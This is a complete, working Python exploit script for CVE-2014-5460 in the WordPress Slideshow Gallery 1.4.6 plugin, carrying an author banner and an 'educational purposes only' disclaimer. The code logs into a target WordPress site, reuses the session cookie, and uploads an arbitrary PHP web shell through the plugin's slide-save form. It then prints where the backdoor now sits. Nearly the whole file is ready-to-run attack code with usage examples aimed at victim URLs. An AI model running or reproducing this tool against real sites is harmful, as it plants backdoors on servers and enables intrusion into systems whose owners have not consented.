#!/usr/bin/env python
#
# WordPress Slideshow Gallery 1.4.6 Shell Upload Exploit
#
# WordPress Slideshow Gallery plugin version 1.4.6 suffers from a remote shell upload vulnerability (CVE-2014-5460)
#
# Vulnerability discovered by: Jesus Ramirez Pichardo - http://whitexploit.blogspot.mx/
#
# Exploit written by: Claudio Viviani - info@homelab.it - http://www.homelab.it
#
#
# Disclaimer:
#
# This exploit is intended for educational purposes only and the author
# can not be held liable for any kind of damages done whatsoever to your machine,
# or damages caused by some other,creative application of this exploit.
# In any case you disagree with the above statement,stop here.
#
#
# Requirements:
#
# 1) Enabled user management slide
# 2) python's httplib2 lib
#    Installation: pip install httplib2
#
# Usage:
#
# python wp_gallery_slideshow_146_suv.py -t http[s]://localhost -u user -p pwd -f sh33l.php
# python wp_gallery_slideshow_146_suv.py -t http[s]://localhost/wordpress -u user -p pwd -f sh33l.php
# python wp_gallery_slideshow_146_suv.py -t http[s]://localhost:80|443 -u user -p pwd -f sh33l.php
#
# Backdoor Location:
#
# http://localhost/wp-content/uploads/slideshow-gallery/sh33l.php
#
# Tested on Wordpress 3.6, 3.7, 3.8, 3.9, 4.0
#

# http connection
import urllib, httplib2, sys, mimetypes
# Args management
import optparse
# Error management
import socket, httplib, sys
# file management
import os, os.path

# Check url
def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('[X] You must insert http:// or https:// procotol')
        sys.exit(1)
    else:
        return url

# Check if file exists and has readable
def checkfile(file):
    if not os.path.isfile(file) and not os.access(file, os.R_OK):
        print '[X] '+file+' file is missing or not readable'
        sys.exit(1)
    else:
        return file
# Get file's mimetype
def get_content_type(filename):
    return mimetypes.guess_type(filename)[0] or 'application/octet-stream'

# Create multipart header
def create_body_sh3ll_upl04d(payloadname):

   getfields = dict()
   getfields['Slide[id]'] = ''
   getfields['Slide[order]'] = ''
   getfields['Slide[title]'] = 'h0m3l4b1t'
   getfields['Slide[description]'] = 'h0m3l4b1t'
   getfields['Slide[showinfo]'] = 'both'
   getfields['Slide[iopacity]'] = '70'
   getfields['Slide[type]'] = 'file'
   getfields['Slide[image_url]'] = ''
   getfields['Slide[uselink]'] = 'N'
   getfields['Slide[link]'] = ''
   getfields['Slide[linktarget]'] = 'self'
   getfields['Slide[title]'] = 'h0m3l4b1t'

   payloadcontent = open(payloadname).read()

   LIMIT = '----------lImIt_of_THE_fIle_eW_$'
   CRLF = '\r\n'

   L = []
   for (key, value) in getfields.items():
      L.append('--' + LIMIT)
      L.append('Content-Disposition: form-data; name="%s"' % key)
      L.append('')
      L.append(value)

   L.append('--' + LIMIT)
   L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('image_file', payloadname))
   L.append('Content-Type: %s' % get_content_type(payloadname))
   L.append('')
   L.append(payloadcontent)
   L.append('--' + LIMIT + '--')
   L.append('')
   body = CRLF.join(L)
   return body

banner = """

 $$$$$$\  $$\ $$\       $$\                     $$\
$$  __$$\ $$ |\__|      $$ |                    $$ |
$$ /  \__|$$ |$$\  $$$$$$$ | $$$$$$\   $$$$$$$\ $$$$$$$\   $$$$$$\  $$\  $$\  $$\
\$$$$$$\  $$ |$$ |$$  __$$ |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\ $$ | $$ | $$ |
 \____$$\ $$ |$$ |$$ /  $$ |$$$$$$$$ |\$$$$$$\  $$ |  $$ |$$ /  $$ |$$ | $$ | $$ |
$$\   $$ |$$ |$$ |$$ |  $$ |$$   ____| \____$$\ $$ |  $$ |$$ |  $$ |$$ | $$ | $$ |
\$$$$$$  |$$ |$$ |\$$$$$$$ |\$$$$$$$\ $$$$$$$  |$$ |  $$ |\$$$$$$  |\$$$$$\$$$$  |
 \______/ \__|\__| \_______| \_______|\_______/ \__|  \__| \______/  \_____\____/



             $$$$$$\            $$\ $$\                                       $$\ $$\   $$\     $$$$$$\
            $$  __$$\           $$ |$$ |                                    $$$$ |$$ |  $$ |   $$  __$$\
            $$ /  \__| $$$$$$\  $$ |$$ | $$$$$$\   $$$$$$\  $$\   $$\       \_$$ |$$ |  $$ |   $$ /  \__|
            $$ |$$$$\  \____$$\ $$ |$$ |$$  __$$\ $$  __$$\ $$ |  $$ |        $$ |$$$$$$$$ |   $$$$$$$\
            $$ |\_$$ | $$$$$$$ |$$ |$$ |$$$$$$$$ |$$ |  \__|$$ |  $$ |        $$ |\_____$$ |   $$  __$$\
            $$ |  $$ |$$  __$$ |$$ |$$ |$$   ____|$$ |      $$ |  $$ |        $$ |      $$ |   $$ /  $$ |
            \$$$$$$  |\$$$$$$$ |$$ |$$ |\$$$$$$$\ $$ |      \$$$$$$$ |      $$$$$$\ $$\ $$ |$$\ $$$$$$  |
             \______/  \_______|\__|\__| \_______|\__|       \____$$ |      \______|\__|\__|\__|\______/
                                                            $$\   $$ |
                                                            \$$$$$$  |
                                                             \______/

                                                                   W0rdpr3ss Sl1d3sh04w G4ll3ry 1.4.6 Sh3ll Upl04d Vuln.

                          =============================================
                          - Release date: 2014-08-28
                          - Discovered by: Jesus Ramirez Pichardo
                          - CVE: 2014-5460
                          =============================================

                                          Written by:

                                        Claudio Viviani

                                     http://www.homelab.it

                                        info@homelab.it
                                     homelabit@protonmail.ch

                                https://www.facebook.com/homelabit
                                https://twitter.com/homelabit
                                https://plus.google.com/+HomelabIt1/
                      https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
"""

commandList = optparse.OptionParser('usage: %prog -t URL -u USER -p PASSWORD -f FILENAME.PHP [--timeout sec]')
commandList.add_option('-t', '--target', action="store",
                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",
                  )
commandList.add_option('-f', '--file', action="store",
                  help="Insert file name, ex: shell.php",
                  )
commandList.add_option('-u', '--user', action="store",
                  help="Insert Username",
                  )
commandList.add_option('-p', '--password', action="store",
                  help="Insert Password",
                  )
commandList.add_option('--timeout', action="store", default=10, type="int",
                  help="[Timeout Value] - Default 10",
                  )

options, remainder = commandList.parse_args()

# Check args
if not options.target or not options.user or not options.password or not options.file:
    print(banner)
    commandList.print_help()
    sys.exit(1)

payloadname = checkfile(options.file)
host = checkurl(options.target)
username = options.user
pwd = options.password
timeout = options.timeout

print(banner)

url_login_wp = host+'/wp-login.php'
url_admin_slideshow = host+'/wp-admin/admin.php?page=slideshow-slides&method=save'

content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'

http = httplib2.Http(disable_ssl_certificate_validation=True, timeout=timeout)

# Wordpress login POST Data
body = { 'log':username,
         'pwd':pwd,
         'wp-submit':'Login',
         'testcookie':'1' }
# Wordpress login headers with Cookie
headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Content-type': 'application/x-www-form-urlencoded',
            'Cookie': 'wordpress_test_cookie=WP+Cookie+check' }
try:
    response, content = http.request(url_login_wp, 'POST', headers=headers, body=urllib.urlencode(body))
    if len(response['set-cookie'].split(" ")) < 4:
    #if 'httponly' in response['set-cookie'].split(" ")[-1]:
        print '[X] Wrong username or password'
        sys.exit()
    else:
        print '[+] Username & password ACCEPTED!\n'

        # Create cookie for admin panel
        if 'secure' in response['set-cookie']:
            c00k13 = response['set-cookie'].split(" ")[6]+' '+response['set-cookie'].split(" ")[0]+' '+response['set-cookie'].split(" ")[10]
        else:
            c00k13 = response['set-cookie'].split(" ")[5]+' '+response['set-cookie'].split(" ")[0]+' '+response['set-cookie'].split(" ")[8]

        bodyupload = create_body_sh3ll_upl04d(payloadname)

        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                   'Cookie': c00k13,
                   'content-type': content_type,
                   'content-length': str(len(bodyupload)) }
        response, content = http.request(url_admin_slideshow, 'POST', headers=headers, body=bodyupload)

        if 'admin.php?page=slideshow-slides&Galleryupdated=true&Gallerymessage=Slide+has+been+saved' in content:
            print '[!] Shell Uploaded!'
            print '[+] Check url: '+host+'/wp-content/uploads/slideshow-gallery/'+payloadname.lower()+' (lowercase!!!!)'
        else:
            print '[X] The user can not upload files or plugin fixed :((('

except socket.timeout:
    print('[X] Connection Timeout')
    sys.exit(1)
except socket.error:
    print('[X] Connection Refused')
    sys.exit(1)
except httplib.ResponseNotReady:
    print('[X] Server Not Responding')
    sys.exit(1)
except httplib2.ServerNotFoundError:
    print('[X] Server Not Found')
    sys.exit(1)
except httplib2.HttpLib2Error:
    print('[X] Connection Error!!')
    sys.exit(1)